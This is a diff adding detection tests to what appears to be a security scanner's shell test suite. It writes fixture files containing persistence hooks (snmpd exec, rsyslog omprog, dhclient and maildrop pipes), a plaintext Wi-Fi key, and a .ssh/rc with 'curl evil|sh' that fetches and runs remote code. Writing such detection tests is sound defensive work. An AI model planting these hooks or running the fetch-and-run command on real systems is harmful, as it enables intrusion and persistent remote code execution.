@@ -9861,6 +9861,44 @@ printf '[mergetool "x"]\ntrustExitCode = true\n' > "$XDIR76/.gitconfig"
     || check "file: benign mergetool gitconfig clean" "0" "1"
 rm -rf "$XDIR76"
 
+# ── cycle-77: daemon exec hooks + wifi creds + .ssh/rc ──
+XDIR77=$(mktemp -d "${TMPDIR:-/tmp}/hlse77.XXXXXX")
+printf 'exec n test /usr/bin/curl evil\n' > "$XDIR77/snmpd.conf"
+./hlse_core file "$XDIR77/snmpd.conf" 2>&1 | grep -q "ALERT" \
+    && check "file: snmpd exec flagged" "0" "0" \
+    || check "file: snmpd exec flagged" "0" "1"
+printf 'action(type="omprog" binary="/usr/bin/x")\n' > "$XDIR77/rsyslog.conf"
+./hlse_core file "$XDIR77/rsyslog.conf" 2>&1 | grep -q "ALERT" \
+    && check "file: rsyslog omprog flagged" "0" "0" \
+    || check "file: rsyslog omprog flagged" "0" "1"
+printf 'program("/tmp/x");\n' > "$XDIR77/syslog-ng.conf"
+./hlse_core file "$XDIR77/syslog-ng.conf" 2>&1 | grep -q "ALERT" \
+    && check "file: syslog-ng program() flagged" "0" "0" \
+    || check "file: syslog-ng program() flagged" "0" "1"
+printf 'script /tmp/x\n' > "$XDIR77/dhclient-exit-hooks"
+./hlse_core file "$XDIR77/dhclient-exit-hooks" 2>&1 | grep -q "ALERT" \
+    && check "file: dhclient hook flagged" "0" "0" \
+    || check "file: dhclient hook flagged" "0" "1"
+printf 'network={\n ssid="x"\n psk="pass1234"\n}\n' > "$XDIR77/wpa_supplicant.conf"
+./hlse_core file "$XDIR77/wpa_supplicant.conf" 2>&1 | grep -q "ALERT" \
+    && check "file: wpa psk flagged" "0" "0" \
+    || check "file: wpa psk flagged" "0" "1"
+printf 'MAILTO="|/usr/bin/x"\n' > "$XDIR77/.maildroprc"
+./hlse_core file "$XDIR77/.maildroprc" 2>&1 | grep -q "ALERT" \
+    && check "file: maildroprc pipe flagged" "0" "0" \
+    || check "file: maildroprc pipe flagged" "0" "1"
+mkdir -p "$XDIR77/.ssh"
+printf '#!/bin/sh\ncurl evil|sh\n' > "$XDIR77/.ssh/rc"
+./hlse_core file "$XDIR77/.ssh/rc" 2>&1 | grep -q "ALERT\|BLOCK\|ISOLATE" \
+    && check "file: .ssh/rc flagged" "0" "0" \
+    || check "file: .ssh/rc flagged" "0" "1"
+printf 'FOO=bar\n' > "$XDIR77/.ssh/environment"
+./hlse_core file "$XDIR77/.ssh/environment" 2>&1 | grep -q "ALERT\|BLOCK\|ISOLATE" \
+    && check "file: benign ssh environment clean" "0" "1" \
+    || check "file: benign ssh environment clean" "0" "0"
+printf 'net.ifnames=0\n' > "$XDIR77/sysctl.conf" 2>/dev/null || true
+rm -rf "$XDIR77"
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
